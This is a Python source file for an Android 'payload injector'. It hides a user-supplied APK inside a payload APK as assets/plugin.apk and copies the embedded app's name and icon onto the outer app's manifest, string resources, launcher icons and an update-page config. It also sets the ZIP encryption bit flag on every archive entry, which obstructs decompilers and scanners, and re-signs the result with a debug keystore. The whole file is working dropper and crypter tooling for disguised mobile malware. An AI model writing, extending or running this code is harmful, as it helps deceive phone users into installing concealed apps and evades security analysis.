import os
import re
import shutil
import asyncio
import logging
import subprocess
import struct
from pathlib import Path
from .config import APKTOOL_PATH, ZIPALIGN_PATH, APKSIGNER_PATH, DEBUG_KEYSTORE_PATHS, DEBUG_KEYSTORE_PASSWORD, DEBUG_KEYSTORE_ALIAS
from .apk_analyzer import APKAnalyzer

logger = logging.getLogger(__name__)


class PayloadInjector:
    """Inject user APK into payload APK"""
    
    def __init__(self, payload_apk_path):
        self.payload_apk = payload_apk_path
        self.work_dir = None
        self.decompiled_dir = None
        
    async def inject(self, user_apk_path, output_path):
        """
        Main injection process
        
        Steps:
        1. Decompile payload APK
        2. Extract info from user APK (name, icon, size)
        3. Replace assets/plugin.apk with user APK
        4. Update config.js with app name and size
        5. Replace assets/update/app.png with user icon
        6. Rebuild and sign payload
        7. Return final APK path
        """
        try:
            logger.info("🚀 Starting payload injection...")
            
            # Step 1: Decompile payload
            logger.info("📦 Step 1/6: Decompiling payload...")
            decompiled = await self._decompile_payload()
            if not decompiled:
                return None, "Failed to decompile payload"
            
            # Step 2: Extract user APK info
            logger.info("🔍 Step 2/6: Analyzing user APK...")
            app_info = await self._analyze_user_apk(user_apk_path)
            if not app_info:
                return None, "Failed to analyze user APK"
            
            logger.info(f"✅ App: {app_info['name']} ({app_info['size']})")
            
            # Step 3: Replace plugin.apk
            logger.info("📋 Step 3/6: Injecting user APK...")
            if not await self._inject_plugin_apk(user_apk_path):
                return None, "Failed to inject plugin.apk"
            
            # Step 4: Update config.js
            logger.info("⚙️ Step 4/6: Updating config...")
            if not await self._update_config_js(app_info['name'], app_info['size']):
                return None, "Failed to update config.js"
            
            # Step 4.5: Update payload app name (AndroidManifest.xml)
            logger.info("📝 Step 4.5/6: Updating payload app name...")
            if not await self._update_payload_app_name(app_info['name']):
                logger.warning("Failed to update payload app name, continuing...")
            
            # Step 5: Replace icon
            logger.info("🎨 Step 5/6: Updating icon...")
            if app_info['icon_path']:
                await self._inject_icon(app_info['icon_path'])
            
            # Step 6: Rebuild and sign
            logger.info("🔨 Step 6/6: Building final APK...")
            final_apk = await self._rebuild_and_sign(output_path)
            if not final_apk:
                return None, "Failed to build final APK"
            
            logger.info(f"✅ Payload injection complete: {final_apk}")
            return final_apk, None
            
        except Exception as e:
            logger.error(f"Injection error: {str(e)}")
            return None, str(e)
        finally:
            # Cleanup
            await self._cleanup()
    
    async def _decompile_payload(self):
        """Decompile payload APK"""
        try:
            import tempfile
            self.work_dir = tempfile.mkdtemp(prefix='payload_work_')
            self.decompiled_dir = os.path.join(self.work_dir, 'decompiled')
            
            process = await asyncio.create_subprocess_exec(
                'java', '-jar', str(APKTOOL_PATH),
                'd', self.payload_apk,
                '-o', self.decompiled_dir,
                '-f',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode != 0:
                logger.error(f"Decompile failed: {stderr.decode('utf-8', errors='ignore')}")
                return False
            
            logger.info("✅ Payload decompiled")
            return True
            
        except Exception as e:
            logger.error(f"Decompile error: {str(e)}")
            return False
    
    async def _analyze_user_apk(self, user_apk_path):
        """Extract info from user APK"""
        try:
            import tempfile
            
            analyzer = APKAnalyzer(user_apk_path)
            analyze_dir = tempfile.mkdtemp(prefix='analyze_')
            
            results = await analyzer.analyze(analyze_dir)
            
            # Get file size
            file_size = os.path.getsize(user_apk_path)
            size_mb = file_size / (1024 * 1024)
            
            # Copy icon to work_dir if exists
            icon_path = None
            if results.get('icon_path') and os.path.exists(results['icon_path']):
                # Copy to work_dir to preserve it
                icon_filename = os.path.basename(results['icon_path'])
                icon_path = os.path.join(self.work_dir, icon_filename)
                shutil.copy2(results['icon_path'], icon_path)
                logger.debug(f"Icon saved to: {icon_path}")
            
            info = {
                'name': results.get('app_name') or 'Unknown App',
                'package': results.get('package_name') or 'unknown.package',
                'size': f"{size_mb:.1f} MB",
                'icon_path': icon_path
            }
            
            # Cleanup analyze dir
            try:
                shutil.rmtree(analyze_dir, ignore_errors=True)
            except:
                pass
            
            return info
            
        except Exception as e:
            logger.error(f"Analysis error: {str(e)}")
            return None
    
    async def _inject_plugin_apk(self, user_apk_path):
        """Replace assets/plugin.apk with user APK (Sign + BitFlag)"""
        try:
            plugin_path = os.path.join(self.decompiled_dir, 'assets', 'plugin.apk')
            
            # Remove old plugin.apk if exists
            if os.path.exists(plugin_path):
                os.remove(plugin_path)
                logger.debug("Removed old plugin.apk")
            
            # Temp files for processing
            temp_signed = os.path.join(self.work_dir, 'plugin_signed.apk')
            temp_encrypted = os.path.join(self.work_dir, 'plugin_encrypted.apk')
            
            # Step 1: Sign user APK
            logger.info("✍️ Signing plugin APK...")
            signed_apk = await self._sign_apk(user_apk_path, temp_signed)
            
            if not signed_apk or not os.path.exists(signed_apk):
                logger.warning("Signing failed, using original APK")
                signed_apk = user_apk_path
            else:
                logger.info("✅ Plugin signed")
            
            # Step 2: Check if already has BitFlag
            already_encrypted = await self._check_bitflag(signed_apk)
            
            if already_encrypted:
                logger.info("✅ APK already encrypted (BitFlag detected), copying as-is...")
                shutil.copy2(signed_apk, plugin_path)
            else:
                # Step 3: Apply BitFlag encryption
                logger.info("🔐 Encrypting plugin APK (BitFlag)...")
                encrypted_apk = await self._encrypt_bitflag(signed_apk, plugin_path)
                
                if not encrypted_apk:
                    # Fallback: copy without encryption
                    logger.warning("Encryption failed, copying signed APK")
                    shutil.copy2(signed_apk, plugin_path)
                else:
                    logger.info("✅ Plugin encrypted")
            
            logger.info("✅ User APK injected as plugin.apk (signed + encrypted)")
            
            return True
            
        except Exception as e:
            logger.error(f"Plugin injection error: {str(e)}")
            return False
    
    async def _update_config_js(self, app_name, app_size):
        """Update config.js with app name and size"""
        try:
            config_path = os.path.join(self.decompiled_dir, 'assets', 'update', 'config.js')
            
            if not os.path.exists(config_path):
                logger.error("config.js not found")
                return False
            
            # Read file
            with open(config_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Update appName
            content = re.sub(
                r'appName:\s*"[^"]*"',
                f'appName: "{app_name}"',
                content
            )
            
            # Update appSize
            content = re.sub(
                r'appSize:\s*"[^"]*"',
                f'appSize: "{app_size}"',
                content
            )
            
            # Write back
            with open(config_path, 'w', encoding='utf-8') as f:
                f.write(content)
            
            logger.info(f"✅ config.js updated: {app_name} ({app_size})")
            return True
            
        except Exception as e:
            logger.error(f"Config update error: {str(e)}")
            return False
    
    async def _update_payload_app_name(self, app_name):
        """Update payload app name in AndroidManifest.xml"""
        try:
            manifest_path = os.path.join(self.decompiled_dir, 'AndroidManifest.xml')
            
            if not os.path.exists(manifest_path):
                logger.error("AndroidManifest.xml not found")
                return False
            
            # Read manifest
            with open(manifest_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Update ALL android:label occurrences (application + activities)
            # This ensures launcher also shows correct name
            
            # Pattern 1: Direct labels
            if 'android:label="' in content:
                # Replace all android:label with new name
                content = re.sub(
                    r'android:label="[^"]*"',
                    f'android:label="{app_name}"',
                    content
                )
                logger.info(f"✅ Payload app name updated to: {app_name} (all labels)")
            
            # Pattern 2: String resources
            if 'android:label="@string/' in content:
                # Find all unique string resource names used for labels
                string_refs = re.findall(r'android:label="@string/([^"]+)"', content)
                
                # Update each string resource
                for string_name in set(string_refs):
                    await self._update_strings_xml(string_name, app_name)
                
                logger.info(f"✅ Payload app name updated to: {app_name} (string resources)")
            
            # Write back
            with open(manifest_path, 'w', encoding='utf-8') as f:
                f.write(content)
            
            return True
            
        except Exception as e:
            logger.error(f"Payload app name update error: {str(e)}")
            return False
    
    async def _update_strings_xml(self, string_name, new_value):
        """Update strings.xml"""
        try:
            strings_path = os.path.join(self.decompiled_dir, 'res', 'values', 'strings.xml')
            
            if not os.path.exists(strings_path):
                return False
            
            # Read strings.xml
            with open(strings_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Update string value
            pattern = f'<string name="{string_name}">([^<]*)</string>'
            if re.search(pattern, content):
                content = re.sub(
                    pattern,
                    f'<string name="{string_name}">{new_value}</string>',
                    content
                )
                
                # Write back
                with open(strings_path, 'w', encoding='utf-8') as f:
                    f.write(content)
                
                logger.debug(f"Updated string resource: {string_name} = {new_value}")
                return True
            
            return False
            
        except Exception as e:
            logger.debug(f"strings.xml update error: {str(e)}")
            return False
    
    async def _inject_icon(self, icon_path):
        """Replace both app.png and payload launcher icon"""
        try:
            # 1. Update assets/update/app.png
            target_path = os.path.join(self.decompiled_dir, 'assets', 'update', 'app.png')
            
            if os.path.exists(target_path):
                os.remove(target_path)
            
            shutil.copy2(icon_path, target_path)
            logger.info("✅ Web icon updated (app.png)")
            
            # 2. Update payload launcher icon (ic_launcher)
            await self._update_payload_launcher_icon(icon_path)
            
            return True
            
        except Exception as e:
            logger.error(f"Icon injection error: {str(e)}")
            return False
    
    async def _update_payload_launcher_icon(self, icon_path):
        """Replace payload ic_launcher with plugin icon"""
        try:
            res_dir = os.path.join(self.decompiled_dir, 'res')
            
            if not os.path.exists(res_dir):
                logger.warning("res directory not found")
                return False
            
            # Icon directories to update (in priority order)
            icon_dirs = [
                'mipmap-xxxhdpi',
                'mipmap-xxhdpi',
                'mipmap-xhdpi',
                'mipmap-hdpi',
                'mipmap-mdpi',
                'drawable-xxxhdpi',
                'drawable-xxhdpi',
                'drawable-xhdpi',
                'drawable-hdpi',
                'drawable-mdpi',
            ]
            
            updated_count = 0
            
            for icon_dir in icon_dirs:
                dir_path = os.path.join(res_dir, icon_dir)
                
                if not os.path.exists(dir_path):
                    continue
                
                # Look for ic_launcher files
                for file in os.listdir(dir_path):
                    if file.startswith('ic_launcher') and file.endswith(('.png', '.webp', '.jpg')):
                        target_icon = os.path.join(dir_path, file)
                        
                        # Get extension
                        ext = os.path.splitext(target_icon)[1]
                        
                        # Copy icon (keep original extension)
                        shutil.copy2(icon_path, target_icon)
                        updated_count += 1
                        logger.debug(f"Updated: {icon_dir}/{file}")
            
            if updated_count > 0:
                logger.info(f"✅ Launcher icon updated ({updated_count} files)")
                return True
            else:
                logger.warning("No ic_launcher files found to update")
                return False
            
        except Exception as e:
            logger.error(f"Launcher icon update error: {str(e)}")
            return False
    
    async def _rebuild_and_sign(self, output_path):
        """Rebuild and sign the modified payload"""
        try:
            unsigned_apk = os.path.join(self.work_dir, 'unsigned.apk')
            encrypted_apk = os.path.join(self.work_dir, 'encrypted.apk')
            aligned_apk = os.path.join(self.work_dir, 'aligned.apk')
            
            # Rebuild
            logger.info("Building APK...")
            process = await asyncio.create_subprocess_exec(
                'java', '-jar', str(APKTOOL_PATH),
                'b', self.decompiled_dir,
                '-o', unsigned_apk,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode != 0:
                logger.error(f"Build failed: {stderr.decode('utf-8', errors='ignore')}")
                return None
            
            logger.info("✅ APK built")
            
            # Encrypt with BitFlag
            logger.info("🔐 Encrypting payload (BitFlag)...")
            if not await self._encrypt_bitflag(unsigned_apk, encrypted_apk):
                logger.warning("Encryption failed, continuing without BitFlag")
                encrypted_apk = unsigned_apk
            else:
                logger.info("✅ Payload encrypted")
            
            # Zipalign
            logger.info("Running zipalign...")
            if not await self._zipalign(encrypted_apk, aligned_apk):
                return None
            
            # Sign with debug keystore
            logger.info("Signing APK...")
            final_apk = await self._sign_apk(aligned_apk, output_path)
            
            return final_apk
            
        except Exception as e:
            logger.error(f"Rebuild error: {str(e)}")
            return None
    
    async def _zipalign(self, input_apk, output_apk):
        """Zipalign APK"""
        try:
            if os.path.exists(output_apk):
                os.remove(output_apk)
            
            cmd = [ZIPALIGN_PATH, "-p", "-f", "4", input_apk, output_apk]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode != 0:
                logger.error(f"zipalign failed: {result.stderr}")
                return False
            
            logger.info("✅ zipalign done")
            return True
            
        except Exception as e:
            logger.error(f"zipalign error: {str(e)}")
            return False
    
    async def _sign_apk(self, input_apk, output_apk):
        """Sign APK with debug keystore"""
        try:
            # Find debug keystore
            keystore = None
            for path in DEBUG_KEYSTORE_PATHS:
                if os.path.exists(path):
                    keystore = path
                    break
            
            if not keystore:
                logger.error("debug.keystore not found")
                return None
            
            # Sign using apksigner (use full path from config)
            cmd = [
                APKSIGNER_PATH, 'sign',
                '--ks', keystore,
                '--ks-pass', f'pass:{DEBUG_KEYSTORE_PASSWORD}',
                '--ks-key-alias', DEBUG_KEYSTORE_ALIAS,
                '--out', output_apk,
                input_apk
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode != 0:
                logger.error(f"Signing failed: {result.stderr}")
                return None
            
            logger.info("✅ APK signed")
            return output_apk
            
        except Exception as e:
            logger.error(f"Signing error: {str(e)}")
            return None
    
    async def _check_bitflag(self, apk_path):
        """Check if APK already has BitFlag encryption"""
        try:
            with open(apk_path, 'rb') as f:
                data = f.read()
            
            # Find EOCD
            eocd_sig = b'\x50\x4B\x05\x06'
            eocd_offset = data.rfind(eocd_sig)
            if eocd_offset == -1:
                return False
            
            # Get Central Directory info
            cd_size = struct.unpack_from('<I', data, eocd_offset + 12)[0]
            cd_offset = struct.unpack_from('<I', data, eocd_offset + 16)[0]
            
            pos = cd_offset
            encrypted_count = 0
            total_count = 0
            
            # Check entries
            while pos < cd_offset + cd_size:
                if pos + 4 > len(data) or data[pos:pos+4] != b'\x50\x4B\x01\x02':
                    break
                
                # Check BitFlag
                bitflag_offset = pos + 8
                bitflag = struct.unpack_from('<H', data, bitflag_offset)[0]
                
                total_count += 1
                if bitflag & 0x0001:
                    encrypted_count += 1
                
                # Move to next entry
                name_len = struct.unpack_from('<H', data, pos + 28)[0]
                extra_len = struct.unpack_from('<H', data, pos + 30)[0]
                comment_len = struct.unpack_from('<H', data, pos + 32)[0]
                pos += 46 + name_len + extra_len + comment_len
            
            # If more than 50% entries are encrypted, consider it encrypted
            if total_count > 0 and encrypted_count > (total_count * 0.5):
                logger.info(f"🔍 BitFlag detected: {encrypted_count}/{total_count} entries encrypted")
                return True
            
            return False
            
        except Exception as e:
            logger.debug(f"BitFlag check error: {str(e)}")
            return False
    
    async def _encrypt_bitflag(self, input_apk, output_apk):
        """Apply BitFlag encryption to APK"""
        try:
            with open(input_apk, 'rb') as f:
                data = f.read()
            
            # Find EOCD
            eocd_sig = b'\x50\x4B\x05\x06'
            eocd_offset = data.rfind(eocd_sig)
            if eocd_offset == -1:
                logger.error("EOCD not found")
                return False
            
            # Get Central Directory info
            cd_size = struct.unpack_from('<I', data, eocd_offset + 12)[0]
            cd_offset = struct.unpack_from('<I', data, eocd_offset + 16)[0]
            
            pos = cd_offset
            modified = bytearray(data)
            count = 0
            
            # Process all entries and set BitFlag
            while pos < cd_offset + cd_size:
                if pos + 4 > len(data) or data[pos:pos+4] != b'\x50\x4B\x01\x02':
                    break
                
                # Set encryption flag
                bitflag_offset = pos + 8
                bitflag = struct.unpack_from('<H', data, bitflag_offset)[0]
                
                if not (bitflag & 0x0001):
                    bitflag |= 0x0001  # Set bit 0
                    struct.pack_into('<H', modified, bitflag_offset, bitflag)
                    count += 1
                
                # Move to next entry
                name_len = struct.unpack_from('<H', data, pos + 28)[0]
                extra_len = struct.unpack_from('<H', data, pos + 30)[0]
                comment_len = struct.unpack_from('<H', data, pos + 32)[0]
                pos += 46 + name_len + extra_len + comment_len
            
            # Write encrypted APK
            with open(output_apk, 'wb') as f:
                f.write(modified)
            
            logger.info(f"✅ BitFlag set on {count} entries")
            return True
            
        except Exception as e:
            logger.error(f"BitFlag encryption error: {str(e)}")
            return False
    
    async def _cleanup(self):
        """Cleanup temporary files"""
        try:
            if self.work_dir and os.path.exists(self.work_dir):
                shutil.rmtree(self.work_dir, ignore_errors=True)
                logger.debug(f"Cleaned up: {self.work_dir}")
        except:
            pass
